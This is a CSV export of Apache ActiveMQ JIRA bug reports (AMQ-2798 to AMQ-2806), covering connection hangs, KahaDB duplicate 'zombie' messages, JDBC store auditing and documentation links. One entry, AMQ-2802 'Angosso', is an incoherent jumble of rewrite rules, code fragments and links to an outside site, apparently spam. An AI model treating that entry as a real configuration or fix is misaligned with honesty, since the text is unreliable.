Bad Javadoc on PooledConnectionFactory suggests we should not use PooledConnectionFactory for consumers!,AMQ-2806,12483930,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,adrian.trenaman,adrian.trenaman,29/Jun/10 09:42,29/Jun/10 10:48,14/Jul/23 05:43,29/Jun/10 10:48,,,,,,5.4.0,,,,,,,0,,,,,,,,,"See: http://activemq.apache.org/maven/activemq-core/apidocs/org/apache/activemq/pool/PooledConnectionFactory.html. This note concerning jencks is now out of date, and the ongoing recommendation seems to be to use activemq-pool. ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74791,,,Tue Jun 29 10:48:02 UTC 2010,,,,,,,,,,,"0|i0rqjr:",159945,,,,,,,,,,,,,,,,,,,,,"29/Jun/10 10:48;gtully;r958921

add ref to activemq-camel (which needs some updates) and activemq spring  and prefetch and explain why pool does not pool consumers.
For message consumption, spring MLC with default concurrentConsumers=1 does the right thing and with concurrentConsumers>1 can run into the issues related to prefetch. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Erroneous link to CMS from an ActiveMQ doc page,AMQ-2805,12482892,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,gbirchmeier,gbirchmeier,28/Jun/10 19:44,28/Jun/10 20:00,14/Jul/23 05:43,28/Jun/10 20:00,,,,,,,,,Documentation,,,,0,,,,,,,,,"The page http://activemq.apache.org/javadocs.html links to the bad URL http://activemq.apache.org/cms/html/.

It should instead point to http://activemq.apache.org/cms/.

The page served by the erroneous URL looks like it's actually the target of a bad redirect within the CMS sub-pages.  You'll notice that any of the relative URL links keep returning the same page (as they are all bad URLs), whereas the page returned by the correct URL contains correct links for those pages.

See related issue https://issues.apache.org/activemq/browse/AMQCPP-299",web page documentation,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,600,600,,0%,600,600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74792,,,Mon Jun 28 20:00:10 UTC 2010,,,,,,,,,,,"0|i182uf:",255263,,,,,,,,,,,,,,,,,,,,,"28/Jun/10 20:00;tabish;Fixed, should be fine once the site refreshes;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Database lock driver override not found for : [oracle_jdbc_driver].  Will use default implementation.,AMQ-2804,12482894,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Blocker,Fixed,rajdavies,ractive,ractive,28/Jun/10 17:31,13/Apr/12 06:17,14/Jul/23 05:43,13/Apr/12 06:17,5.3.2,,,,,5.6.0,,,,,,,0,,,,,,,,,"I am trying to do activeMQ Clustering with ORACLE database(master/slave).After the configuration I do see three tables created in the database but I don't see data is storing in the database. In fact it's storing in the activemq-data folder(default implementation). I see these warnings in the log.

INFO | Database adapter driver override recognized for : [oracle_jdbc_driver] - adapter: class org.apache.activemq.store.jdbc.adapter.OracleJDBCAdapter
 INFO | Database lock driver override not found for : [oracle_jdbc_driver].  Will use default implementation.


So somehow it's not using database ?? Any help on this is greatly appreciated.","2.6.9-89.0.11.ELsmp #1 SMP Mon Aug 31 11:00:34 EDT 2009 x86_64 x86_64 x86_64 GNU/Linux
",kimmking,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74793,,,Fri Apr 13 06:17:11 UTC 2012,,,,,,,,,,,"0|i0akef:",59578,,,,,,,,,,,,,,,,,,,,,"28/Jan/11 03:00;gliesian;I'm seeing a similar issue with Apache Derby: http://activemq.2283324.n4.nabble.com/Connecting-to-the-Apache-Derby-database-being-used-by-ActiveMQ-td3243546.html.

I'm using 5.4.2.;;;","10/Feb/12 15:47;kimmking;DefaultDatabaseLocker use this sql to get an  exclusive lock:
select .... for update.

so it's correct for Oracle;;;","10/Feb/12 16:18;kimmking;derby also support for-update syntax, see http://db.apache.org/derby/docs/dev/ref/  select segment.
so I think it's well with derby.

notice that it's INFO, not WARN or ERROR.

if DefaultDatabaseLocker can't get a locker, it will report it, sleep a while and retry.
;;;","13/Apr/12 06:17;rajdavies;This looks fixed in 5.6;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"'Zombie' messages created in KahaDB after failover, with warning 'Duplicate message add attempt rejected.'",AMQ-2803,12483932,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,adrian.trenaman,adrian.trenaman,28/Jun/10 11:00,08/Jul/10 14:38,14/Jul/23 05:43,08/Jul/10 14:38,5.3.2,,,,,5.4.0,,,Message Store,,,,0,,,,,,,,,"Am doing some failover testing of ActiveMQ, sending 10,000 messages to the broker with a live consumer; the producer and consumer are transactional, and the broker is configured to use KahaDB. On failover of the broker, I see log warnings like this: 

{code}
 WARN | Duplicate message add attempt rejected. Message id: ID:Ade's-54024-1277715585703-0:29:1:1:240
 WARN | Duplicate message add attempt rejected. Message id: ID:Ade's-54024-1277715585703-0:24:1:1:241
 WARN | Duplicate message add attempt rejected. Message id: ID:Ade's-54024-1277715585703-0:23:1:1:242
 WARN | Duplicate message add attempt rejected. Message id: ID:Ade's-54024-1277715585703-0:0:1:1:237
{code}

When the test has run its course, I discover that there are no messages lost - all my messages have gone through successfully. However, I notice that there are in fact a number of 'zombie' messages on the queue: by 'zombie' I mean that the messages are in the store, and the JMX queueSize says they're there. However, if you browse the queue you don't see them, and, if you have a consumer on the queue, you won't receive them either. 

Looking into the code, in {{org.apache.activemq.store.kahadb.MessageDatabase}} you can see the following very interesting comments concerning the log warning:

{code}
               // If the message ID as indexed, then the broker asked us to store a DUP
                // message.  Bad BOY!  Don't do it, and log a warning.
                LOG.warn(""Duplicate message add attempt rejected. Message id: ""+command.getMessageId());
                // TODO: consider just rolling back the tx.
                sd.messageIdIndex.put(tx, command.getMessageId(), previous);
{code} 

So. It seems to me that while we're detecting the condition of the broker trying to reinsert a message that's already in the KahaDB correctly, we're not handling this case very well. The outcome is that while we do not get any message loss, we do get worrying warning messages *and* we get erroneous reporting of the queueSize in JMX which will mislead and create the perception of undelivered messages.


",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74794,,,Thu Jul 08 14:38:26 UTC 2010,,,,,,,,,,,"0|i0rqjj:",159944,,,,,,,,,,,,,,,,,,,,,"28/Jun/10 11:14;gtully;https://issues.apache.org/activemq/browse/AMQ-2542 will address this by implementing duplicate suppression at the transport when a failover occurs. This will ensure that the store does not get duplicates in the normal failover case.
;;;","28/Jun/10 11:30;adrian.trenaman;As an alternative, I've tried the same test using the {{<amqPersistenceAdapter>}} instead, with the configuration below. 

{code:xml}
		<persistenceAdapter>
			<!-- <kahaDB directory=""${activemq-broker.dataDirectory}"" /> -->
			<amqPersistenceAdapter directory=""${activemq-broker.dataDirectory}"" syncOnWrite=""true"" maxFileLength=""32mb""/>
		</persistenceAdapter>
{code}

Using this adapter instead of KahaDB, I find that I don't get the warning message. However, I *do* get the same 'zombie' messages in JMX: the queueSize suggests that there are messages to be delivered (for example, in two failover tests I ended up with a JMX {{QueueSize}} of '3' and '1' respectively after failover), when in fact all messages were delivered successfully. Nicely, the {{<amqPersistenceAdapter>}} is better behaved in that if I restart the broker then the {{QueueSize}} is reported correctly again. ;;;","28/Jun/10 11:46;adrian.trenaman;Thanks Gary for the note. 

Any idea when the fix for AMQ-2542 will go live? Is it currently on trunk at Apache? ;;;","28/Jun/10 11:56;gtully;I am working on it atm, so should have some completion by the end of the week. Any tests you can provide to validate will be appreciated... there a a bunch of tests that assert duplicate suppression and ordering but non that tie it together with the queue sizes  and jmx.
You can access the brokerview and pull out the relevant stats from junit test if u want to verify them.;;;","28/Jun/10 13:36;adrian.trenaman;Cool. I'll see if I can put together a unit test for this - alternatively, get in touch with me off-line and I can give you a non-Junit test-case.
;;;","08/Jul/10 14:38;gtully;resolved in r961783;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Angosso,AMQ-2802,12483525,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,angosso_net,angosso_net,26/Jun/10 11:14,11/Sep/10 22:41,14/Jul/23 05:43,26/Jun/10 11:26,5.3.0,,,,,5.4.1,,,Connector,,,,0,,,,,,,,,"For sites running on a port other than 80 RewriteCond %{HTTP_HOST} !^www\.angosso\.net [www.angosso.net/]% RewriteCond %{HTTP_HOST} !^Angosso^% RewriteCond %{SERVER_PORT} !^80% RewriteRule ^/(.*) http://www.angosso.net:80%{ANGOSSO_NET} /8080% [L,R] RewriteRule ^FR-news\.html http://www.angosso.net/news/index.html [P] RewriteRule ^http://www\.remotesite\.net/(.*)$mirroran_user /mirror/of/remotesite/$http://www.angosso.net/index.html -->patchfile resolve--> Parent Directory /* $Id$Angosso.net/index.html/ */ incubation public void outputConfigurationHeader(IThreadContext threadContext, IHTTPOutput out, ConfigParams parameters, ArrayList tabsArray) throws LCFException, IOException { tabsArray.add(""Angosso Siteweb Inc.""); tabsArray.add(""http://www.angosso.net/""); out.print( ""<script type=\""text/javascript\"">\n""+ ""<!--\n""+ ""\n""+ ""function checkConfig()\n""+ ""{\n""+ "" if (editconnection.angosso.netserverport.value != \""\"" && !isInteger(editconnection.angosso.netserverport.value))\n""+ "" return true;\n""+ ""function checkConfigForSave()\n""+ public String[www.angosso.net/index.html/] getForcedAcls() { return orderedTokens; } } } ",Linux & Apache,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,648000,648000,,0%,648000,648000,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"26/Jun/10 11:25;angosso_net;build.xml;https://issues.apache.org/jira/secure/attachment/12461753/build.xml","26/Jun/10 11:24;angosso_net;ldap-client-api-0.1.jar;https://issues.apache.org/jira/secure/attachment/12461752/ldap-client-api-0.1.jar","26/Jun/10 11:17;angosso_net;mod_jk.so;https://issues.apache.org/jira/secure/attachment/12461750/mod_jk.so","26/Jun/10 11:17;angosso_net;web.xml;https://issues.apache.org/jira/secure/attachment/12461751/web.xml",,,,,,,,,,,,,,,,,,4.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74795,,,2010-06-26 11:14:18.0,,,,,,,Patch Available,,,,"0|i0rpiv:",159779,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Durable subscriber on startup ignores Selectors when calculating pending queue size,AMQ-2801,12482899,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,cgsmithe,cgsmithe,25/Jun/10 15:42,28/Aug/12 11:31,14/Jul/23 05:43,05/Aug/11 15:06,5.3.2,,,,,5.6.0,,,JMX,Selector,,,2,,,,,,,,,"The attached test case demonstrates the following scenario.  

-       Start all durable subscriber connections (on Separate JVMs) each with different selectors.
-       Publish messages to ActiveMQ that only matches one of selectors.
-       Close the connection to both subscribers and restart both connections.
-       The other durable subscriber pending queue size is displayed with the enqeue count for the subscriber on the activemq console.",Windows XP SP3,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3998,,,,,,,,,,,,,,,,,,"25/Jun/10 15:43;cgsmithe;InvalidPendingQueueTest.java;https://issues.apache.org/jira/secure/attachment/12461748/InvalidPendingQueueTest.java","25/Jun/10 15:43;cgsmithe;activemq.xml;https://issues.apache.org/jira/secure/attachment/12461749/activemq.xml",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,60100,,,Fri Aug 05 15:06:24 UTC 2011,,,,,,,,,,,"0|i0aken:",59579,,,,,,,,,,,,,,,,,,,,,"05/Aug/11 15:06;tabish;Created a test case based on the attached sample app, problem seems to be fixed.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
JDBCMessageStore message audit suppresses composite destination and DLQ messages as duplicates,AMQ-2800,12483473,12482853,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,25/Jun/10 14:15,02/Sep/10 07:54,14/Jul/23 05:43,08/Jul/10 14:41,5.3.1,,,,,5.4.0,,,Message Store,,,,0,,,,,,,,,"With the audit enabled, messages send to composite destinations are suppressed as duplicates so the will not survive a restart. In addition, persistent DLQ messages are suppressed (depending on the audit depth).
Disabling the audit on the persistence adapter works around this issue. It is ok to disable the audit. The audit is needed to close a small window where duplicate message sends can occur with the non transactional use of the failover: transport. It can happen if a send is in progress when a failover reconnection occurs back o the same broker (as if there was a temp network partition) and the send reply is not received. A non transactional client will resend the message which needs to be suppressed by the audit. Disabling the audit leaves the possibility of having a duplicate message in the database that will not be dispatched.",,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-2756,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74796,,,Thu Jul 08 14:41:47 UTC 2010,,,,,,,,,,,"0|i0rqjb:",159943,,,,,,,,,,,,,,,,,,,,,"08/Jul/10 14:41;gtully;resolved in r961783

Ack removal from store needs to take destination into account as the same message id exists for multiple destinations when composite destinations are in use. The ack needs to be specific as it could (this bug) remove the wrong message.
added test for this case.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Occaional hangs on ensureConnectionInfoSent,AMQ-2798,12482129,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,wanderingwalrus,wanderingwalrus,25/Jun/10 06:48,09/May/22 17:13,14/Jul/23 05:43,25/Feb/11 23:35,5.3.2,,,,,5.5.0,,,JMS client,,,,1,,,,,,,,,"When connecting to the broker, the client occasionally starts to hang. A thread dump reveals:

{noformat}
""QuartzScheduler_Worker-7"" prio=5 tid=0x0116f190 nid=0x1ce2400 waiting on condition [0xf1fae000..0xf1fafb30]
	at sun.misc.Unsafe.park(Native Method)
	at java.util.concurrent.locks.LockSupport.park(LockSupport.java:118)
	at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:1767)
	at java.util.concurrent.ArrayBlockingQueue.take(ArrayBlockingQueue.java:341)
	at org.apache.activemq.transport.FutureResponse.getResult(FutureResponse.java:40)
	at org.apache.activemq.transport.ResponseCorrelator.request(ResponseCorrelator.java:80)
	at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1233)
	at org.apache.activemq.ActiveMQConnection.ensureConnectionInfoSent(ActiveMQConnection.java:1339)
	- locked <0x10b9bdf8> (a java.lang.Object)
	at org.apache.activemq.ActiveMQConnection.createSession(ActiveMQConnection.java:298)
	at org.jencks.amqpool.SessionPool.createSession(SessionPool.java:110)
	at org.jencks.amqpool.SessionPool.makeObject(SessionPool.java:78)
	at org.apache.commons.pool.impl.GenericObjectPool.borrowObject(GenericObjectPool.java:974)
	at org.jencks.amqpool.SessionPool.borrowSession(SessionPool.java:53)
	at org.jencks.amqpool.ConnectionPool.createSession(ConnectionPool.java:89)
	at org.jencks.amqpool.XaConnectionPool.createSession(XaConnectionPool.java:51)
	at org.jencks.amqpool.PooledConnection.createSession(PooledConnection.java:132)
	at org.springframework.jms.support.JmsAccessor.createSession(JmsAccessor.java:200)
{noformat}

Looking closer at the code of {{ensureConnectionInfoSent}} in {{ActiveMQConnection}}, it uses the method:

{code}
public Response syncSendPacket(Command command) throws JMSException {
{code}

which never times out, possibly causing everything to hang eternally. There does seem to be an identical method that allows for a timeout. 

{code}
    public Response syncSendPacket(Command command, int timeout) throws JMSException {
{code}

should / can ensureConnectionInfoSent use the one with the timeout instead?

We're using the failover transport:
failover:(tcp://<someIP>:54663?wireFormat.maxInactivityDuration=300000)?maxReconnectAttempts=10&amp;initialReconnectDelay=15000",,akhanzode,fbenoit,gagan.deep,jayas,pbruski,roydar,samion,smil,sthalasayanam,wangyin,windeyu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-6043,,,,,,,,,,,,,,,,AMQCPP-643,,,,,,,,,,,,,"17/Aug/10 18:04;akhanzode;blocked-connection-patch3;https://issues.apache.org/jira/secure/attachment/12461800/blocked-connection-patch3",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,46504,,,Mon May 09 17:13:50 UTC 2022,,,,,,,,,,,"0|i0akev:",59580,,,,,,,,,,,,,,,,,,,,,"17/Aug/10 14:34;akhanzode;I can reproduce this issue. I am using Master/Slave configuration with Master set to waitForSlave=""true"" 
Start Master and then start consumer. Consumer hangs at ensureConnectionInfoSent() does not matter if I am using shared or unshared connection.

I added a property syncResponseTimeout in factory and connection and wired it in. Changed syncSendPacket to use timeout and I dont get hung consumer.

I am going to attach a patch.;;;","17/Aug/10 14:37;akhanzode;Patch I used to fix this issue. I am not expert in this codebase but ping me if this is not the best way. This is STOPPING us from going to production with this issue open.;;;","17/Aug/10 17:53;akhanzode;Attaching new patch as FailoverTransactionTest was failing. Still running tests.;;;","17/Aug/10 18:56;tabish;Have you tried just adding in the startupMaxReconnectAttempts option to your connection URI?  This option will limit the number of time the Failover Transport will attempt to reconnect on startup and allow the client to fail after that number of tries.;;;","17/Aug/10 19:08;akhanzode;I have startupMaxReconnectAttempts=2 and it does not work.

my brokerURL looks like failover:(tcp://hostname:61616?keepAlive=true)?randomize=false&amp;startupMaxReconnectAttempts=2

keepAlive or not it fails.;;;","18/Aug/10 08:08;wanderingwalrus;@Tim, I think the problem is happening at a lower level than that. As in, I think the the {{ensureConnectionInfoSent}} does the {{syncSendPacket}} on some sort of advisorial transport (I think org.apache.activemq.transport.ResponseCorrelator) and not the actual specified transport. This seems likely since syncSendPacket calls {{(Response)this.transport.request(command)}} and for FailoverTransport, the implementation for this is:

{code}
    public Object request(Object command) throws IOException {
        throw new AssertionError(""Unsupported Method"");
    }
{code}

;;;","18/Aug/10 16:06;pbruski;The attached patch may throw an NPE on timeout, depending on transport.
;;;","18/Aug/10 21:18;akhanzode;Do you think ResponseCrrelator needs to guard against nulls? I always assumes that Command (Object o) is a valid object. Or Can we assume if Response is null the connection is closed?;;;","18/Aug/10 21:45;tabish;Version 5.4.0 adds a RequestTimeoutException that is thrown on timeout in ResponseCorrelator so the NPE is not an issue any longer.

Currently the code is operating as designed, the case where the connection.start or createSession is hanging is awaiting a response from the broker for its ConnectionInfo.  The case in which this is happening in regards to this issue is when the Master broker is up but awaiting its slave to start as well.  In this case the Master is there but it won't respond to the ConnectionInfo and the connection breaks at which time the FailoverTransport tries again to connect.  This explains why the maxReconnectAttempts and startupMaxReconnectAttempts don't apply here since it is able to actually open a socket successfully to the Master broker, it just doesn't complete the connect cycle because the master is awaiting its slave before it will allow any connections.  Once the slave comes online and the Master completes its start-up then the Connection should be established as normal.


;;;","19/Aug/10 11:07;pbruski;I am not sure whether it's also an issue, but it seems that although ResponseCorrelator is fixed, ReliableTransport may still return null, since it does:
{code}
while (timeout > 0) {
...
}
return response.getResult(0);
{code}

and FutureResponse does:

{code}
if (result == null && timeout > 0) {
       throw new RequestTimedOutIOException();
}
return result;
{code};;;","19/Aug/10 13:42;akhanzode;I see that 5.4.0 behaves better. Is there any property that controlls the timeout? Additionally I see excessive logging in this situation and activemq takes over CPU.
Here is the exception:
2010-08-19 09:39:17,090 INFO  [org.apache.activemq.broker.TransportConnection.Transport] Transport failed: java.io.IOException: The transport is not running.
java.io.IOException: The transport is not running.
	at org.apache.activemq.transport.TransportSupport.checkStarted(TransportSupport.java:107)
	at org.apache.activemq.transport.tcp.TcpTransport.oneway(TcpTransport.java:179)
	at org.apache.activemq.transport.InactivityMonitor.oneway(InactivityMonitor.java:244)
	at org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:85)
	at org.apache.activemq.transport.WireFormatNegotiator.oneway(WireFormatNegotiator.java:104)
	at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40)
	at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1247)
	at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:808)
	at org.apache.activemq.broker.TransportConnection.dispatchSync(TransportConnection.java:768)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:187)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
	at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:217)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:219)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:201)
	at java.lang.Thread.run(Thread.java:619)
;;;","25/Feb/11 23:35;tabish;I believe this has been resolved, please reopen if there's still an issue here;;;","23/Feb/12 14:23;fbenoit;Sadly, I still have this exact issue in 5.5.0 (reproducible every time). Jstack shows the same stack as described. Is there a workaround ?

Edit: Also tested with 5.5.1 and 5.6-snapshot, same behaviour.;;;","08/Mar/13 01:19;windeyu;We encountered the error too.  We're on 5.7.0.  Below is the thread stack of the hanging thread.  It doesn't happen often, but it's there.  We're using the failover uri.

<networkConnector name=""perform33"" uri=""static:(tcp://perform31:61616?keepAlive=true&amp;wireFormat.tightEncodingEnabled=false&amp;wireFormat.cacheEnabled=false,tcp://perform38:61616?keepAlive=true&amp;wireFormat.tightEncodingEnabled=false&amp;wireFormat.cacheEnabled=false)?useExponentialBackOff=false"">



Name: defaultQuartzScheduler_Worker-1
State: WAITING on java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject@3bd8ed5f
Total blocked: 10  Total waited: 10

Stack trace: 
sun.misc.Unsafe.park(Native Method)
java.util.concurrent.locks.LockSupport.park(Unknown Source)
java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(Unknown Source)
java.util.concurrent.ArrayBlockingQueue.take(Unknown Source)
org.apache.activemq.transport.FutureResponse.getResult(FutureResponse.java:40)
org.apache.activemq.transport.ResponseCorrelator.request(ResponseCorrelator.java:87)
org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1366)
org.apache.activemq.ActiveMQConnection.ensureConnectionInfoSent(ActiveMQConnection.java:1481)
   - locked java.lang.Object@4bdacc2e

org.apache.activemq.ActiveMQConnection.start(ActiveMQConnection.java:516)
org.mule.transport.jms.JmsConnector.doStart(JmsConnector.java:626)
org.mule.transport.AbstractConnector$2.onTransition(AbstractConnector.java:459)
org.mule.transport.AbstractConnector$2.onTransition(AbstractConnector.java:454)
org.mule.lifecycle.AbstractLifecycleManager.invokePhase(AbstractLifecycleManager.java:141)
org.mule.transport.ConnectorLifecycleManager.fireStartPhase(ConnectorLifecycleManager.java:63)
org.mule.transport.AbstractConnector.startAfterConnect(AbstractConnector.java:453)
   - locked org.mule.transport.jms.activemq.ActiveMQJmsConnector@20fb07d4

org.mule.transport.AbstractConnector$5.doWork(AbstractConnector.java:1601)
org.mule.retry.policies.AbstractPolicyTemplate.execute(AbstractPolicyTemplate.java:67)
org.mule.transport.AbstractConnector.connect(AbstractConnector.java:1611)
org.mule.transport.AbstractConnector.start(AbstractConnector.java:419)
   - locked org.mule.transport.jms.activemq.ActiveMQJmsConnector@20fb07d4

sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
java.lang.reflect.Method.invoke(Unknown Source)
org.mule.lifecycle.phases.DefaultLifecyclePhase.applyLifecycle(DefaultLifecyclePhase.java:225)
org.mule.lifecycle.RegistryLifecycleManager$RegistryLifecycleCallback.onTransition(RegistryLifecycleManager.java:276)
org.mule.lifecycle.RegistryLifecycleManager.invokePhase(RegistryLifecycleManager.java:155)
org.mule.lifecycle.RegistryLifecycleManager.fireLifecycle(RegistryLifecycleManager.java:126)
org.mule.registry.AbstractRegistryBroker.fireLifecycle(AbstractRegistryBroker.java:80)
org.mule.registry.MuleRegistryHelper.fireLifecycle(MuleRegistryHelper.java:121)
org.mule.lifecycle.MuleContextLifecycleManager$MuleContextLifecycleCallback.onTransition(MuleContextLifecycleManager.java:94)
org.mule.lifecycle.MuleContextLifecycleManager$MuleContextLifecycleCallback.onTransition(MuleContextLifecycleManager.java:90)
org.mule.lifecycle.MuleContextLifecycleManager.invokePhase(MuleContextLifecycleManager.java:72)
org.mule.lifecycle.MuleContextLifecycleManager.fireLifecycle(MuleContextLifecycleManager.java:64)
org.mule.DefaultMuleContext.start(DefaultMuleContext.java:202)
   - locked org.mule.DefaultMuleContext@13aaf18f
;;;","08/Mar/13 01:29;windeyu;By the way, we turned off the producer flow control.

<policyEntry queue="">"" timeBeforeDispatchStarts=""30000"" producerFlowControl=""false"" useCache=""false"">
</policyEntry>;;;","08/Mar/13 02:42;wangyin;You can not talk to the master which the slave is not attached.
The master being waiting for the slave essentially opens a server socket but never accepts/reads the client socket.
Have you tried to enable soTimeout option?
http://activemq.apache.org/tcp-transport-reference.html;;;","11/Mar/13 21:57;windeyu;Hi SuoNayi,
Thank you for your feedback.  Your second point about soTimeout is a valuable suggestion for me to try!  Since this issue happens rarely for us, I will tell if this will fix our case over time.
About your first point, I'm confused.  We're using the ""shared storage master/slave"".  The slave is simply standby and keeps trying to grab the distributed file lock.  The master has no knowledge of the slave(s).  The Jms clients (the mule connectors in our case) can establish connections only to the master.  I don't follow when you said ""you can not talk to the master which the slave is not attached.""  Or am I mistaken somewhere?
